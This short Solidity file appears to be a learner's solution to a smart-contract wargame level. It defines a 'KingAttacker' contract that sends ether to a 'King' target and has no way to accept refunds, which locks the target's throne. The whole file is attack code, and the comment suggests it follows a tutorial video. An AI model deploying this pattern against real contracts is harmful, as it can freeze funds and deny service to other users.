// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract KingAttacker is Ownable {
    using Address for address payable;
    function attack(address payable _kingContractAddres) external payable onlyOwner {
        _kingContractAddres.sendValue(msg.value); // Igual al video.
    }
}
